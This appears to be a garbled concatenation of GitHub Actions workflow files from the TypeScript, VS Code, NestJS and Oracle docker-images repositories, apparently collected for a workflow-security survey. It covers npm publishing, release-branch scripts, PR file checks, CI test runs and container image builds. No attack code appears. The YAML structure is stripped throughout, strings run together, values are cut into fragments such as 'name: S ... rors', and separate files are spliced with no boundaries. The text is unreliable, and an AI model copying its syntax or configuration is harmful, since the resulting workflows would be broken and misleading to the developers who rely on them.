|| gh issue create --repo ${{ github.repository }} --title "No TypeScript ServerErrors issue since $DATE" --body "$TAGS Please check the [pipeline](https://typescript.visualstudio.com/TypeScript/_build?definitionId=59)."
name: S ... rors TSServerErrors JSDATE=$(date --date="7 days ago" --iso-8601)
gh issue list --repo microsoft/typescript --search "[ServerErrors][JavaScript] created:>=$DATE" --state all --json number --jq ".[].number" \
| grep -qe "[0-9]" \
|| gh issue create --repo ${{ github.repository }} --title "No JavaScript ServerErrors issue since $DATE" --body "$TAGS Please check the [pipeline](https://typescript.visualstudio.com/TypeScript/_build?definitionId=58)."
name: S ... rors JS- name: NewErrorscheck-for-recent:name: ' ... tchdog'/home/huawei/github-actions-security/.github/workflows/microsoft_TypeScript__insiders.yamlPublish Insidersrepository_dispatchpublish-insiders[publish-insiders]types:  ... siders]Test insidersnpm ci
npx hereby configure-insiders
npm test
name: Test insidershttps://registry.npmjs.org/https:/ ... js.org/Setup and publish insidersSetup a ... nsidersnpm whoami
npm ci
npx hereby configure-insiders
npx hereby LKG
node ./scripts/addPackageJsonGitHead.mjs package.json
npm publish --tag insiders
${{secrets.npm_token}}${{secr ... token}}NODE_AU ... token}}name: S ... nsidersneeds: testname: P ... nsiders/home/huawei/github-actions-security/.github/workflows/microsoft_TypeScript__lkg.ymlUpdate LKGbranch_nameRelease branch name to LKGRelease ...  to LKGdescrip ...  to LKGbranch_name:if [[ ! "${{ inputs.branch_name }}" =~ ^release- ]]; then
  echo "Branch name must start with 'release-'"
  exit 1
fi
${{ inputs.branch_name }}ref: ${ ... name }}npm ci
npx hereby LKG
git add --force ./lib
git config user.email "typescriptbot@microsoft.com"
git config user.name "TypeScript Bot"
git commit -m 'Update LKG'
git push
- run: |name: Update LKG/home/huawei/github-actions-security/.github/workflows/microsoft_TypeScript__new-release-branch.yamlNew Release BranchRelease branch name to createRelease ...  createdescrip ...  createpackage_versionRelease package versiondescrip ... versioncore_major_minorRelease core major.minor versiongit checkout -b ${{ inputs.branch_name }}
sed -i -e 's/"version": ".*"/"version": "${{ inputs.package_version }}"/g' package.json
sed -i -e 's/const versionMajorMinor = ".*"/const versionMajorMinor = "${{ inputs.core_major_minor }}"/g' src/compiler/corePublic.ts
sed -i -e 's/const versionMajorMinor = ".*"/const versionMajorMinor = "${{ inputs.core_major_minor }}"/g' tests/baselines/reference/api/typescript.d.ts
sed -i -e 's/const version\(: string\)\{0,1\} = .*;/const version = "${{ inputs.package_version }}" as string;/g' src/compiler/corePublic.ts
npm ci
npm install # update package-lock.json to ensure the version bump is included
npx hereby LKG
npm test
git diff
git add package.json package-lock.json
git add src/compiler/corePublic.ts
git add tests/baselines/reference/api/typescript.d.ts
git add --force ./lib
git config user.email "typescriptbot@microsoft.com"
git config user.name "TypeScript Bot"
git commit -m 'Bump version to ${{ inputs.package_version }} and LKG'
git push --set-upstream origin ${{ inputs.branch_name }}
I've created ${{ inputs.branch_name }} with version ${{ inputs.package_version }} for you."I've c ... r you."I was unable to create the new release branch.'I was  ... ranch.'success ... r you."name: N ...  Branch/home/huawei/github-actions-security/.github/workflows/microsoft_TypeScript__nightly.yamlPublish Nightly0 7 * * *'0 7 * * *'cron: '0 7 * * *'- cron: '0 7 * * *'Setup and publish nightlySetup a ... nightlynpm ci
npx hereby configure-nightly
npm test
name: S ... nightly[test]npm whoami
npm ci
npx hereby configure-nightly
npx hereby LKG
node ./scripts/addPackageJsonGitHead.mjs package.json
npm publish --tag next
needs: [test]name: P ... Nightly/home/huawei/github-actions-security/.github/workflows/microsoft_TypeScript__pr-modified-files.ymlCheck modified files${{ github.workflow }}-${{ github.event.pull_request.number || github.ref }}manage-prsCheck if PR author is in pr_owners.txtCheck i ... ers.txtpr_ownercurl -s https://raw.githubusercontent.com/microsoft/TypeScript/main/.github/pr_owners.txt > pr_owners.txt
if grep -Fxq -m1 "${{ github.event.pull_request.user.login }}" pr_owners.txt; then
  echo "pr_owner=true" >> "$GITHUB_OUTPUT"
else
  echo "pr_owner=false" >> "$GITHUB_OUTPUT"
fi
name: C ... ers.txtCreate scriptscat > is_changed.sh <<'EOF'
  #!/bin/bash
  FILENAME=changed_files.txt
  if [ ! -f $FILENAME ]; then
    # The gh command only returns info for the first 100 files. To get
    # the rest, we have to use the graphql API. See:
    # https://github.com/cli/cli/issues/5368#issuecomment-1344253654
    gh api graphql -f query='
      query($endCursor: String) {
        repository(owner: "microsoft", name: "TypeScript") {
          pullRequest(number: ${{ github.event.pull_request.number }}) {
            files(first: 100, after: $endCursor) {
              pageInfo{ hasNextPage, endCursor }
              nodes {
                path
              }
            }
          }
        }
      }' --paginate --jq '.data.repository.pullRequest.files.nodes.[].path' > $FILENAME
  fi
  for file in "$@"; do
    grep -Fxq -m1 "$file" $FILENAME && exit 0
  done
  exit 1
EOF
chmod +x is_changed.sh

cat > already_commented.sh <<'EOF'
  #!/bin/bash
  FILENAME=bot_comments.txt
  if [ ! -f $FILENAME ]; then
    gh pr view ${{ github.event.pull_request.number }} --repo ${{ github.repository }} \
      --json 'comments' --jq '.comments[] | select(.author.login == "typescript-bot") | .body' > $FILENAME
  fi
  exec grep -Fq -m1 "$1" $FILENAME
EOF
chmod +x already_commented.sh
name: Create scriptsGenerated DOM filessteps.pr_owner.outputs.pr_owner == 'false'steps.p ... 'false'if ./is_changed.sh "src/lib/dom.generated.d.ts" \
    "src/lib/dom.iterable.generated.d.ts" \
    "src/lib/webworker.generated.d.ts" \
    "src/lib/webworker.iterable.generated.d.ts"; then
  MESSAGE="It looks like you've sent a pull request to update some generated declaration files related to the DOM."
  MESSAGE+=" These files aren't meant to be edited by hand, as they are synchronized with files in"
  MESSAGE+=" [the TypeScript-DOM-lib-generator repository](https://github.com/microsoft/TypeScript-DOM-lib-generator)."
  MESSAGE+=" You can [read more here](https://github.com/microsoft/TypeScript/blob/main/CONTRIBUTING.md#contributing-libdts-fixes)."
  MESSAGE+=" For house-keeping purposes, this pull request will be closed."

  gh pr close ${{ github.event.pull_request.number }} --repo ${{ github.repository }} --comment "$MESSAGE"
  exit 1 # Stop the pipeline; we just closed the PR.
fi
name: G ... M filesCheck if PR modifies protocol.tsCheck i ... ocol.tsif ./is_changed.sh "src/server/protocol.ts"; then
  MESSAGE="Thanks for the PR! It looks like you've changed the TSServer protocol in some way."
  MESSAGE+=" Please ensure that any changes here don't break consumers of the current TSServer API."
  MESSAGE+=" For some extra review, we'll ping @sheetalkamat, @mjbvz, @zkat, and @joj for you."
  MESSAGE+=" Feel free to loop in other consumers/maintainers if necessary."

  if ./already_commented.sh "It looks like you've changed the TSServer protocol in some way."; then
    echo "Already commented."
  else
    gh pr comment ${{ github.event.pull_request.number }} --repo ${{ github.repository }} --body "$MESSAGE"
  fi
fi
name: C ... ocol.tsCheck for breaking changesCheck f ... changesif ./is_changed.sh "tests/baselines/reference/api/typescript.d.ts"; then
  MESSAGE="Looks like you're introducing a change to the public API surface area."
  MESSAGE+=" If this includes breaking changes, please document them"
  MESSAGE+=" [on our wiki's API Breaking Changes page](https://github.com/microsoft/TypeScript/wiki/API-Breaking-Changes)."
  MESSAGE+=$'\n\n'
  MESSAGE+="Also, please make sure @DanielRosenwasser and @RyanCavanaugh are aware of the changes, just as a heads up."

  if ./already_commented.sh "Looks like you're introducing a change to the public API surface area."; then
    echo "Already commented."
  else
    gh pr comment ${{ github.event.pull_request.number }} --repo ${{ github.repository }} --body "$MESSAGE"
  fi
fi
- name: ... ers.txtmanage-prs:/home/huawei/github-actions-security/.github/workflows/microsoft_TypeScript__release-branch-artifact.yamlCreate Releasable Package DropCreate  ... ge Drop- release-*npm install and testnpm ci
npm test
name: n ... nd testLKG, clean, and packnpx hereby LKG
npx hereby clean
node ./scripts/addPackageJsonGitHead.mjs package.json
npm pack ./
mv typescript-*.tgz typescript.tgz
name: L ... nd packUpload built tarfiletgztypescript.tgzname: tgzname: U ... tarfilename: C ... ge Drop/home/huawei/github-actions-security/.github/workflows/microsoft_TypeScript__scorecard.yml19 15 * * 4'19 15 * * 4'cron: '19 15 * * 4'- cron: ...  * * 4''Checkout code'name: ' ... t code''Run analysis'name: 'Run analysis''Upload artifact''Upload ... anning'github/codeql-action/upload-sarif@45775bd8235c68ba998cffa5171334d58593da47name: ' ... anning'- name: ... t code'/home/huawei/github-actions-security/.github/workflows/microsoft_TypeScript__set-version.yamlSet branch versionsed -i -e 's/"version": ".*"/"version": "${{ inputs.package_version }}"/g' package.json
sed -i -e 's/const versionMajorMinor = ".*"/const versionMajorMinor = "${{ inputs.core_major_minor }}"/g' src/compiler/corePublic.ts
sed -i -e 's/const versionMajorMinor = ".*"/const versionMajorMinor = "${{ inputs.core_major_minor }}"/g' tests/baselines/reference/api/typescript.d.ts
sed -i -e 's/const version\(: string\)\{0,1\} = .*;/const version = "${{ inputs.package_version }}" as string;/g' src/compiler/corePublic.ts
npm ci
npm install # update package-lock.json to ensure the version bump is included
npx hereby LKG
npm test
git diff
git add package.json package-lock.json
git add src/compiler/corePublic.ts
git add tests/baselines/reference/api/typescript.d.ts
git add --force ./lib
git config user.email "typescriptbot@microsoft.com"
git config user.name "TypeScript Bot"
git commit -m 'Bump version to ${{ inputs.package_version }} and LKG'
git push
I've set the version of ${{ inputs.branch_name }} to ${{ inputs.package_version }} for you."I've s ... r you."I was unable set the version.'I was  ... rsion.'name: S ... version/home/huawei/github-actions-security/.github/workflows/microsoft_TypeScript__sync-branch.yamlSync branch with masterSync br ...  mastergit config user.email "typescriptbot@microsoft.com"
git config user.name "TypeScript Bot"
git fetch origin main
git merge origin/main --no-ff
npm ci
npx hereby LKG
git add --force ./lib
git commit -m 'Update LKG'
git push
I've pulled main into ${{ inputs.branch_name }} for you."I've p ... r you."I was unable merge main into ${{ inputs.branch_name }}.'I was  ... me }}.'- uses: ...  v4.4.0name: S ...  master/home/huawei/github-actions-security/.github/workflows/microsoft_TypeScript__sync-wiki.ymlSync Two Wiki Reposgollum[gollum]Get repo nameR=${GITHUB_REPOSITORY%?wiki}; echo "BASENAME=${R##*/}" >> $GITHUB_ENVR=${GIT ... HUB_ENVname: Get repo nameCheckout ${{ env.BASENAME }}-wikiCheckou ... }}-wiki${{ GITHUB.repository_owner }}/${{ env.BASENAME }}-wiki'${{ GI ... }-wiki'reposit ... }-wiki'name: C ... }}-wikiRun sync./.github/workflows/sync./.gith ... ws/syncPUSHERtypescript-bot <bot@typescriptlang.org>typescr ... ng.org>AUTHPUSHER: ... ng.org>name: Run sync- name: ... po namename: S ... i Repos/home/huawei/github-actions-security/.github/workflows/microsoft_TypeScript__twoslash-repros.yamlTwoslash Code Sample ReprosTwoslas ...  Repros0 8 * * *'0 8 * * *'cron: '0 8 * * *'- cron: '0 8 * * *'Limits run to a single issue.Limits  ...  issue.descrip ...  issue.bisectIf set, runs a git bisect on an existing repro. Requires 'issue' to be set. Value can be revision labels (e.g. `good v4.7.3 bad main`) or `true` to infer bisect range.If set, ...  range.descrip ...  range.issue:${{ github.repository == 'microsoft/TypeScript' }}${{ git ... ipt' }}${{ github.event.inputs.bisect }}${{ git ... sect }}if: ${{ ... sect }}${{ !github.event.inputs.bisect }}${{ !gi ... sect }}microsoft/TypeScript-Twoslash-Repro-Action@master${{ github.event.inputs.issue }}${{ git ... ssue }}- if: $ ... sect }}if: ${{ ... ipt' }}name: T ...  Repros/home/huawei/github-actions-security/.github/workflows/microsoft_TypeScript__update-package-lock.yamlUpdate package-lock.jsonUpdate  ... ck.json0 6 * * *'0 6 * * *'cron: '0 6 * * *'- cron: '0 6 * * *'Update package-lock.json and pushUpdate  ... nd pushrm package-lock.json
npm install

if git diff --exit-code --name-only package-lock.json; then
  echo "No change."
else
  npm test
  npx hereby LKG
  git config user.email "typescriptbot@microsoft.com"
  git config user.name "TypeScript Bot"
  git add -f package-lock.json
  git commit -m "Update package-lock.json"
  git push
fi
name: U ... nd pushname: U ... ck.json/home/huawei/github-actions-security/.github/workflows/microsoft_vscode__basic.ymlBasic checksgithub.ref != 'refs/heads/main'Compilation, Unit and Integration TestsCompila ... n TestsSetup Build EnvironmentSetup B ... ronmentsudo cp build/azure-pipelines/linux/xvfb.init /etc/init.d/xvfb
sudo chmod +x /etc/init.d/xvfb
sudo update-rc.d xvfb defaults
sudo service xvfb start
name: S ... ronmentnode-ve ...  .nvmrcCompute node modules cache keyCompute ... che keynodeModulesCacheKeyecho "value=$(node build/azure-pipelines/common/computeNodeModulesCacheKey.js)" >> $GITHUB_OUTPUTecho "v ... _OUTPUTname: C ... che keyCache node modulescacheNodeModules**/node_modules"**/node_modules"${{ runner.os }}-cacheNodeModulesLinux-${{ steps.nodeModulesCacheKey.outputs.value }}${{ run ... alue }}path: " ... odules"Get npm cache directory pathGet npm ... ry pathnpmCacheDirPath${{ steps.cacheNodeModules.outputs.cache-hit != 'true' }}${{ ste ... rue' }}echo "dir=$(npm config get cache)" >> $GITHUB_OUTPUTecho "d ... _OUTPUTname: G ... ry pathCache npm directory${{ steps.npmCacheDirPath.outputs.dir }}${{ ste ... .dir }}${{ runner.os }}-npmCacheDir-${{ steps.nodeModulesCacheKey.outputs.value }}${{ runner.os }}-npmCacheDir-${{ run ... cheDir-path: $ ... .dir }}Execute npmPLAYWRIGHT_SKIP_BROWSER_DOWNLOADPLAYWRI ... OWNLOADPLAYWRI ... LOAD: 1name: Execute npmCompile and Downloadnpm exec -- npm-run-all -lp compile "electron x64"npm exe ... on x64"name: C ... ownloadRun Unit Testselectron-unit-testsDISPLAY=:10 ./scripts/test.shDISPLAY ... test.shname: Run Unit TestsRun Integration Tests (Electron)Run Int ... ectron)electron-integration-testselectro ... n-testsDISPLAY=:10 ./scripts/test-integration.shDISPLAY ... tion.shname: R ... ectron)if: git ... s/main'hygieneHygiene and LayeringRun Hygiene Checksnpm run gulp hygienename: R ...  ChecksRun Valid Layers ChecksRun Val ...  Checksnpm run valid-layers-checknpm run ... s-checkRun Define Class Fields ChecksRun Def ...  Checksnpm run define-class-fields-checkCompile /build/npm run compilename: C ... /build/Check clean git stateCheck c ... t state./.github/workflows/check-clean-git-state.sh./.gith ... tate.shname: C ... t statenpm run eslintRun vscode-dts Compile ChecksRun vsc ...  Checksnpm run vscode-dts-compile-checknpm run ... e-checkRun Trusted Types ChecksRun Tru ...  Checksnpm run tsec-compile-checkwarm-cacheWarm up node modules cacheWarm up ... s cachegithub.ref == 'refs/heads/main'name: W ... s cachename: Basic checks/home/huawei/github-actions-security/.github/workflows/microsoft_vscode__ci.ymlWindows3.x"3.x"python- ... : "3.x"Cache node_modules archiveCache n ... archive.build/node_modules_cache".build ... _cache"${{ runner.os }}-cacheNodeModulesArchive-${{ steps.nodeModulesCacheKey.outputs.value }}"${{ ru ... lue }}"path: " ... _cache"name: C ... archiveExtract node_modules archiveExtract ... archive${{ steps.cacheNodeModules.outputs.cache-hit == 'true' }}7z.exe x .build/node_modules_cache/cache.7z -aos7z.exe  ... 7z -aosname: E ... archivenpm_config_foreground_scriptsnpm_con ... scripts"true"npm_con ...  "true"Create node_modules archiveCreate  ... archivemkdir -Force .build
node build/azure-pipelines/common/listNodeModules.js .build/node_modules_list.txt
mkdir -Force .build/node_modules_cache
7z.exe a .build/node_modules_cache/cache.7z -mx3 `@.build/node_modules_list.txt
npm exec -- npm-run-all -lp compile "electron x64" playwright-install download-builtin-extensionsnpm exe ... ensionsCompile Integration TestsCompile ... n Teststest/integration/browsertest/in ... browsername: C ... n TestsRun Unit Tests (Electron)Run Uni ... ectron).\scripts\test.batRun Unit Tests (node.js)Run Uni ... ode.js)npm run test-nodename: R ... ode.js)Run Unit Tests (Browser, Chromium)Run Uni ... romium)npm run test-browser-no-install -- --browser chromiumnpm run ... hromiumname: R ... romium).\scripts\test-integration.bat.\scrip ... ion.batRun Integration Tests (Browser, Firefox)Run Int ... irefox).\scripts\test-web-integration.bat --browser firefox.\scrip ... firefoxname: R ... irefox)Run Integration Tests (Remote)Run Int ... Remote).\scripts\test-remote-integration.batname: R ... Remote)name: WindowsLinuxsudo apt-get update
sudo apt-get install -y libxkbfile-dev pkg-config libkrb5-dev libxss1 xvfb libgtk-3-0 libgbm1
sudo cp build/azure-pipelines/linux/xvfb.init /etc/init.d/xvfb
sudo chmod +x /etc/init.d/xvfb
sudo update-rc.d xvfb defaults
sudo service xvfb start
nodejs-unit-testsbrowser-unit-testsDISPLAY=:10 npm run test-browser-no-install -- --browser chromiumDISPLAY ... hromiumRun Integration Tests (Browser, Chromium)Run Int ... romium)browser-integration-testsbrowser ... n-testsDISPLAY=:10 ./scripts/test-web-integration.sh --browser chromiumelectron-remote-integration-testsDISPLAY=:10 ./scripts/test-remote-integration.shname: LinuxmacOS${{ runner.os }}-cacheNodeModulesMacOS-${{ steps.nodeModulesCacheKey.outputs.value }}Create temporary keychainCreate  ... eychainsecurity create-keychain -p pwd $RUNNER_TEMP/buildagent.keychain
security default-keychain -s $RUNNER_TEMP/buildagent.keychain
security unlock-keychain -p pwd $RUNNER_TEMP/buildagent.keychain
name: C ... eychainRun Integration Tests (Browser, Webkit)Run Int ... Webkit)DISPLAY=:10 ./scripts/test-web-integration.sh --browser webkitDISPLAY ...  webkitname: R ... Webkit)name: macOSDownload Playwrightnpm run playwright-installnpm run ... installname: D ... ywrightname: H ... ayeringwindows:/home/huawei/github-actions-security/.github/workflows/microsoft_vscode__monaco-editor.ymlMonaco Editor checksrelease/*${{ runner.os }}-cacheNodeModules20-${{ steps.nodeModulesCacheKey.outputs.value }}${{ runner.os }}-cacheNodeModules20-${{ run ... ules20-sudo apt update
sudo apt install -y libxkbfile-dev pkg-config libkrb5-dev libxss1
npm ci
Run Monaco Editor ChecksRun Mon ...  Checksnpm run monaco-compile-checkEditor Distro & ESMnpm run gulp editor-distronpm run ... -distroname: E ... o & ESMEditor ESM sources checkEditor  ... s check./test/monaconpm run esm-checkname: E ... s checkTypings validation prepTypings ... on prepmkdir typings-test
name: T ... on prepTypings validation./typings-testnpm init -yp
../node_modules/.bin/tsc --init
echo "import '../out-monaco-editor-core';" > a.ts
../node_modules/.bin/tsc --noEmit
name: T ... idationPackage Editor with WebpackPackage ... Webpacknpm run bundle-webpacknpm run ... webpackname: P ... WebpackCompile Editor Testsname: C ... r TestsRun Editor Testsname: R ... r Testsname: M ...  checks/home/huawei/github-actions-security/.github/workflows/microsoft_vscode__no-package-lock-changes.ymlPrevent package-lock.json changes in PRsPrevent ...  in PRsoctokit/request-action@dad4362715b7fb2ddedf9772c8670824af564f0doctokit ... f564f0dget_permissionsrouteGET /repos/microsoft/vscode/collaborators/{username}/permissionGET /re ... missionroute:  ... missionuses: o ...  v2.4.0Set control output variableSet con ... ariablecontrolecho "user: ${{ github.event.pull_request.user.login }}"
echo "role: ${{ fromJson(steps.get_permissions.outputs.data).permission }}"
echo "is dependabot: ${{ github.event.pull_request.user.login == 'dependabot[bot]' }}"
echo "should_run: ${{ !contains(fromJson('["admin", "maintain", "write"]'), fromJson(steps.get_permissions.outputs.data).permission) }}"
echo "should_run=${{ !contains(fromJson('["admin", "maintain", "write"]'), fromJson(steps.get_permissions.outputs.data).permission) && github.event.pull_request.user.login != 'dependabot[bot]' }}" >> $GITHUB_OUTPUT
name: S ... ariableGet file changestrilom/file-changes-action@ce38c8ce2459ca3c303415eec8cb0409857b4272trilom/ ... 57b4272${{ steps.control.outputs.should_run == 'true' }}name: G ... changesCheck for lockfile changescat $HOME/files.json | jq -e 'any(test("package-lock\\.json$|Cargo\\.lock$")) | not' \
  || (echo "Changes to package-lock.json/Cargo.lock files aren't allowed in PRs." && exit 1)
- uses: ...  v2.4.0name: P ...  in PRs/home/huawei/github-actions-security/.github/workflows/microsoft_vscode__no-yarn-lock-changes.ymlPrevent yarn.lock changes in PRstrilom/file-changes-action@a6ca26c14274c33b15e6499323aac178af06ad4btrilom/ ... f06ad4bcat $HOME/files.json | jq -e 'any(test("yarn\\.lock$|Cargo\\.lock$")) | not' \
  || (echo "Changes to yarn.lock/Cargo.lock files aren't allowed in PRs." && exit 1)
/home/huawei/github-actions-security/.github/workflows/microsoft_vscode__telemetry.ymlTelemetry'Telemetry'check-metadataCheck metadata'Check metadata''ubuntu-latest''action ... out@v4'uses: ' ... out@v4''action ... ode@v4'uses: ' ... ode@v4'Run vscode-telemetry-extractor'Run vs ... ractor'npx --package=@vscode/telemetry-extractor@1.14.0 --yes vscode-telemetry-extractor -s .'npx -- ... r -s .'name: ' ... ractor'- uses: ... out@v4'name: ' ... tadata'check-metadata:name: 'Telemetry'/home/huawei/github-actions-security/.github/workflows/nestjs_nest__codeql-analysis.yml[master, ]branches: [master, ]branches: [master]0 17 * * 4'0 17 * * 4'cron: '0 17 * * 4'- cron: '0 17 * * 4'analyseAnalysefetch-depth: 2git checkout HEAD^2run: gi ...  HEAD^2+security-extendedqueries ... xtendedanalyse:/home/huawei/github-actions-security/.github/workflows/oracle_docker-images__build-and-push-dev-images.ymlBuild and publish Oracle Linux developer container images to GitHub Container RegistryBuild a ... egistryOracleLinuxDevelopers/**'Oracle ... ers/**'.github/workflows/build-and-push-dev-images.yml- 'Orac ... ers/**'olList of ol versions to buildList of ... o buildoraclelinux7, oraclelinux8, oraclelinux9'oracle ... linux9'descrip ... o buildlangList of languages to buildgcc-toolset, golang, nginx, nodejs, php, python, redis, ruby, haproxy, kubectl, helm, ocne-tools, httpd'gcc-to ...  httpd'ol:gcc-toolset, golang, nodejs, nginx, php, python, redis, ruby, haproxy, kubectl, helm, ocne-tools, httpdol: 'or ... linux9'Create build matrix${{ steps.build-matrix.outputs.matrix }}${{ steps.build-matrix.outputs.skip_build }}${{ ste ... uild }}repository_owner${{ steps.repository_owner.outputs.repository_owner }}${{ ste ... wner }}date_stamp${{ steps.date_stamp.outputs.date_stamp }}${{ ste ... tamp }}32fetch-depth: 32Build matrixbuild-matrixOracleLinuxDevelopersOracleL ... elopersIFS=", " read -r -a ol_list <<< "${{ github.event.inputs.ol || env.ol}}"
IFS=", " read -r -a lang_list <<< "${{ github.event.inputs.lang || env.lang}}"
changes=$(mktemp)
# workflow is only set in the workflow_dispatch event payload
workflow="${{ github.event.workflow }}"
if [[ -z ${workflow} ]]; then
  # Push event - retrieve list of changed files
  git diff --name-only '${{ github.event.before }}..${{ github.event.after }}' > "${changes}"
  if grep -q build-and-push-dev-images.yml "${changes}"; then
    echo "PUSH: Action updated, rebuilding all images"
    build_all=1
  else
    echo "PUSH: Rebuilding changed images only"
    build_all=0
  fi
else
  echo "MANUAL: Rebuilding based on parameters"
  build_all=1
fi
matrix=$(
  for ol in "${ol_list[@]}"; do
    pushd "${ol}" >/dev/null || exit 1
    for lang in "${lang_list[@]}"; do
      if [[ -d ${lang} ]]; then
        pushd "${lang}" >/dev/null || exit 1
        for dockerfile in */Dockerfile; do
          tag=$(dirname "${dockerfile}")
          if [[ -f ${tag}/.skip-arm64 ]]; then
            multi=0
            arch="linux/amd64"
          else
            multi=1
            arch="linux/amd64,linux/arm64"
          fi
          if [[ ${build_all} -eq 1 ]] || grep -q "${ol}/${lang}/${tag}" "${changes}"; then
            echo "${ol};${lang};${tag};${arch};${multi}"
          fi
        done
        popd >/dev/null || exit 1
      fi
    done
    popd >/dev/null || exit 1
  done | jq --slurp --raw-input --compact-output '
    split("\n") |
    .[:-1] |
    map(split(";")) |
    map({"ol": .[0], "lang": .[1], "tag": .[2], "arch": .[3], "multi": (.[4] == "1")})'
)
rm "${changes}"
if [[ ${matrix} == "[]" ]]; then
  # Empty array -- change didn't impact any image
  skip_build=true
else
  skip_build=false
  matrix=$(jq --compact-output '{ "include": .}' <<<"${matrix}")
fi
echo "matrix=${matrix}" >> "$GITHUB_OUTPUT"
echo "skip_build=${skip_build}" >> "$GITHUB_OUTPUT"
name: Build matrixLowercase repository ownerLowerca ... y ownerecho "repository_owner=$(echo '${{ github.repository_owner }}' | tr '[:upper:]' '[:lower:]')" >> "$GITHUB_OUTPUT"
name: L ... y ownerDate stampecho "date_stamp=$(date +'%Y%m%d')" >> "$GITHUB_OUTPUT"
name: Date stampname: C ...  matrixbuild-image[ prepare ]always() && needs.prepare.outputs.skip_build == 'false'always( ... 'false'${{fromJson(needs.prepare.outputs.matrix)}}${{from ... trix)}}matrix: ... trix)}}platforms: arm64Log into GitHub Container RegistryLog int ... egistryBuild image - amd64OracleLinuxDevelopers/${{ matrix.ol }}/${{ matrix.lang }}/${{ matrix.tag }}OracleL ... .tag }}linux/amd64${{ github.event_name != 'pull_request' }}"ghcr.io/${{ needs.prepare.outputs.repository_owner }}/${{ matrix.ol }}-${{ matrix.lang }}:${{ matrix.tag }}-${{ needs.prepare.outputs.date_stamp }}${{ matrix.multi && '-amd64' || '' }}"
"ghcr.io/${{ needs.prepare.outputs.repository_owner }}/${{ matrix.ol }}-${{ matrix.lang }}:${{ matrix.tag }}${{ matrix.multi && '-amd64' || '' }}"
context ... .tag }}name: B ... - amd64Build image - arm64matrix.multilinux/arm64"ghcr.io/${{ needs.prepare.outputs.repository_owner }}/${{ matrix.ol }}-${{ matrix.lang }}:${{ matrix.tag }}-${{ needs.prepare.outputs.date_stamp }}-arm64"
"ghcr.io/${{ needs.prepare.outputs.repository_owner }}/${{ matrix.ol }}-${{ matrix.lang }}:${{ matrix.tag }}-arm64"
name: B ... - arm64Manifestmatrix.multi && github.event_name != 'pull_request'matrix. ... equest'docker buildx imagetools create --tag \
  "ghcr.io/${{ needs.prepare.outputs.repository_owner }}/${{ matrix.ol }}-${{ matrix.lang }}:${{ matrix.tag }}-${{ needs.prepare.outputs.date_stamp }}" \
  "ghcr.io/${{ needs.prepare.outputs.repository_owner }}/${{ matrix.ol }}-${{ matrix.lang }}:${{ matrix.tag }}-${{ needs.prepare.outputs.date_stamp }}-amd64" \
  "ghcr.io/${{ needs.prepare.outputs.repository_owner }}/${{ matrix.ol }}-${{ matrix.lang }}:${{ matrix.tag }}-${{ needs.prepare.outputs.date_stamp }}-arm64"
docker buildx imagetools create --tag \
  "ghcr.io/${{ needs.prepare.outputs.repository_owner }}/${{ matrix.ol }}-${{ matrix.lang }}:${{ matrix.tag }}" \
  "ghcr.io/${{ needs.prepare.outputs.repository_owner }}/${{ matrix.ol }}-${{ matrix.lang }}:${{ matrix.tag }}-amd64" \
  "ghcr.io/${{ needs.prepare.outputs.repository_owner }}/${{ matrix.ol }}-${{ matrix.lang }}:${{ matrix.tag }}-arm64"
name: Manifestname: B ... egistry/home/huawei/github-actions-security/.github/workflows/oracle_docker-images__build-and-push-instantclient-images.ymlBuild and publish Oracle Instant Client container images to GitHub Container RegistryOracleInstantClient/*/19/*'Oracle ... */19/*'OracleInstantClient/*/21/*'Oracle ... */21/*'OracleInstantClient/*/23/*'Oracle ... */23/*'.github/workflows/build-and-push-instantclient-images.yml- 'Orac ... */19/*'Build and push Oracle Instant Client imagesBuild a ...  images${{ steps.linux-version.outputs.ol }}${{ ste ... s.ol }}ic${{ steps.linux-version.outputs.ic }}${{ ste ... s.ic }}ol: ${{ ... s.ol }}Determine which images to buildDetermi ... o buildlinux-versionOracleInstantClientchanges=$(mktemp)
# workflow is only in the workflow_dispatch event payload
workflow="${{ github.event.workflow }}"
if [[ -z ${workflow} ]]; then
  # Push event - retrieve list of changed files
  git diff --name-only '${{ github.event.before }}..${{ github.event.after }}' > "${changes}"
  if grep -q build-and-push-instantclient-images.yml "${changes}"; then
    echo "PUSH: Action updated: rebuilding all images"
    ol="oraclelinux7 oraclelinux8 oraclelinux9"
    ic="19 21 23"
  else
    echo "PUSH: Rebuilding changed images only"
    if grep -q oraclelinux7 "${changes}"; then
      ol="oraclelinux7"
    fi
    if grep -q oraclelinux8 "${changes}"; then
      ol="${ol} oraclelinux8"
    fi
    if grep -q oraclelinux9 "${changes}"; then
      ol="${ol} oraclelinux9"
    fi
    if grep -q /19/ "${changes}"; then
      ic="19"
    fi
    if grep -q /21/ "${changes}"; then
      ic="${ic} 21"
    fi
    if grep -q /23/ "${changes}"; then
      ic="${ic} 23"
    fi
  fi
else
  echo "MANUAL: Rebuilding all"
  ol="oraclelinux7 oraclelinux8 oraclelinux9"
  ic="19 21 23"
fi
echo "Rebuilding: ${ol} ${ic}"
echo "ol=${ol}" >> $GITHUB_OUTPUT
echo "ic=${ic}" >> $GITHUB_OUTPUT
rm "${changes}"
name: D ... o buildecho "${{ secrets.GITHUB_TOKEN }}" | docker login ghcr.io -u ${GITHUB_ACTOR,,} --password-stdinecho "$ ... d-stdinRepository owner needs to be lowercaseReposit ... wercaserepo-ownerREPO_OWNER=${{ github.repository_owner }}
echo "repo-owner=${REPO_OWNER,,}" >> $GITHUB_OUTPUT
name: R ... wercaseBuild Oracle Instant ClientBuild O ...  Clientfor o in ${{ steps.linux-version.outputs.ol }}
do
  for i in ${{ steps.linux-version.outputs.ic }}
  do
    if [[ ${o} = "oraclelinux7" && ${i} = "23" ]]; then
      continue
    fi
    if [[ ${o} = "oraclelinux9" && ${i} = "21" ]]; then
      continue
    fi
    docker build --tag ghcr.io/${{ steps.repo-owner.outputs.repo-owner }}/${o}-instantclient:${i} OracleInstantClient/${o}/${i}
  done
done
name: B ...  ClientPush to GitHub Container RegistryPush to ... egistryfor o in ${{ steps.linux-version.outputs.ol }}
do
  for i in ${{ steps.linux-version.outputs.ic }}
  do
    if [[ ${o} = "oraclelinux7" && ${i} = "23" ]]; then
      continue
    fi
    if [[ ${o} = "oraclelinux9" && ${i} = "21" ]]; then
      continue
    fi
    docker push ghcr.io/${{ steps.repo-owner.outputs.repo-owner }}/${o}-instantclient:${i}
  done
done
